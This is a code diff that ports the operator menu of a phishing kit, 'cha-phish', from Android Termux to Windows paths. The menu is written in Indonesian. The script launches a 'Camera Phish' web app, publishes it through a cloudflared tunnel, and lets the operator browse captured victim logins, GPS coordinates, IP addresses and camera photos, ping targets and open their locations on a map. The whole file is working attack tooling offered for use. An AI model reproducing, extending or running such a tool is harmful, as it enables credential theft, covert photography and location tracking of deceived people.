@@ -1,4 +1,4 @@
-#!/data/data/com.termux/files/usr/bin/bash
+#!/usr/bin/env bash
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -50,9 +50,9 @@ show_menu() {
             echo -e "${YELLOW}🔥 Memulai Camera Phish...${NC}"
             echo -e "${YELLOW}⏳ Mohon tunggu...${NC}"
             echo -e "${YELLOW}📌 Tekan ${GREEN}ENTER${YELLOW} untuk kembali ke menu${NC}"
-            cd ~/cha-phish/"ai mamb" && python app.py > /dev/null 2>&1 &
+            cd "/c/Users/GG/cha-phish/ai mamb" && python app.py > /dev/null 2>&1 &
             sleep 4
-            cloudflared tunnel --url http://localhost:8080 2>&1 | grep -o 'https://[^ ]*\.trycloudflare\.com' &
+            ./cloudflared.exe tunnel --url http://localhost:8080 2>&1 | grep -o 'https://[^ ]*\.trycloudflare\.com' &
             CLOUD_PID=$!
             read -p ""
             echo -e "\n${YELLOW}⏹ Menghentikan tunnel...${NC}"
@@ -62,7 +62,7 @@ show_menu() {
             ;;
         2)
             echo -e "${GREEN}▶ CEK HASIL${NC}"
-            cd ~/cha-phish/"ai mamb"/captured
+            cd "/c/Users/GG/cha-phish/ai mamb/captured"
             echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
             echo -e "${YELLOW}📊 DATA LOGIN + GPS${NC}"
             echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
@@ -78,27 +78,27 @@ show_menu() {
             ;;
         3)
             echo -e "${GREEN}▶ BUKA FOTO${NC}"
-            cd ~/cha-phish/"ai mamb"/captured/images
+            cd "/c/Users/GG/cha-phish/ai mamb/captured/images"
             echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
             echo -e "${YELLOW}📸 DAFTAR FOTO${NC}"
             echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
             ls 2>/dev/null || echo "Belum ada foto"
             echo ""
             read -p "Masukkan nama file foto: " foto
-            termux-open "$foto" 2>/dev/null || echo "File tidak ditemukan"
+            start "$foto" 2>/dev/null || echo "File tidak ditemukan"
             read -p "Tekan Enter untuk kembali..."
             show_menu
             ;;
         4)
             echo -e "${GREEN}▶ COPY FOTO KE GALERI${NC}"
-            cp ~/cha-phish/"ai mamb"/captured/images/*.jpg /sdcard/DCIM/Camera/ 2>/dev/null
-            echo -e "${GREEN}✅ Foto berhasil disalin ke galeri!${NC}"
+            cp "/c/Users/GG/cha-phish/ai mamb/captured/images"/*.jpg /c/Users/GG/Pictures/ 2>/dev/null
+            echo -e "${GREEN}✅ Foto berhasil disalin ke Pictures!${NC}"
             read -p "Tekan Enter untuk kembali..."
             show_menu
             ;;
         5)
             echo -e "${GREEN}▶ CEK IP TARGET${NC}"
-            cd ~/cha-phish/"ai mamb"/captured
+            cd "/c/Users/GG/cha-phish/ai mamb/captured"
             echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
             echo -e "${YELLOW}🌐 IP TARGET TERAKHIR${NC}"
             echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
@@ -109,7 +109,7 @@ show_menu() {
             ;;
         6)
             echo -e "${GREEN}▶ CEK INFO TARGET${NC}"
-            cd ~/cha-phish/"ai mamb"/captured
+            cd "/c/Users/GG/cha-phish/ai mamb/captured"
             echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
             echo -e "${YELLOW}📊 INFO TARGET TERAKHIR${NC}"
             echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
@@ -120,7 +120,7 @@ show_menu() {
             ;;
         7)
             echo -e "${GREEN}▶ CEK KONEKSI TARGET${NC}"
-            cd ~/cha-phish/"ai mamb"/captured
+            cd "/c/Users/GG/cha-phish/ai mamb/captured"
             IP=$(grep -oE 'IP     : [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' data.txt 2>/dev/null | tail -1 | awk '{print $3}')
             if [ -n "$IP" ]; then
                 echo -e "${YELLOW}📍 Ping ke $IP ...${NC}"
@@ -133,11 +133,11 @@ show_menu() {
             ;;
         8)
             echo -e "${GREEN}▶ BUKA LOKASI TARGET DI MAPS${NC}"
-            cd ~/cha-phish/"ai mamb"/captured
+            cd "/c/Users/GG/cha-phish/ai mamb/captured"
             COORD=$(grep -oE 'GPS    : [0-9.-]+, [0-9.-]+' data.txt 2>/dev/null | tail -1 | sed 's/GPS    : //')
             if [ -n "$COORD" ]; then
                 echo -e "${YELLOW}📍 Buka maps: $COORD${NC}"
-                termux-open "https://maps.google.com/?q=$COORD"
+                start "https://maps.google.com/?q=$COORD"
             else
                 echo -e "${RED}❌ Belum ada GPS target!${NC}"
             fi
@@ -154,7 +154,7 @@ show_menu() {
             ;;
         10)
             echo -e "${RED}▶ HAPUS SEMUA HASIL${NC}"
-            rm -rf ~/cha-phish/"ai mamb"/captured/* 2>/dev/null
+            rm -rf "/c/Users/GG/cha-phish/ai mamb/captured"/* 2>/dev/null
             echo -e "${GREEN}✅ Semua hasil berhasil dihapus!${NC}"
             read -p "Tekan Enter untuk kembali..."
             show_menu
@@ -216,5 +216,4 @@ done
 echo -e "\n${GREEN}✅ Loaded!${NC}"
 sleep 0.5
 
-# Panggil menu utama
 show_menu
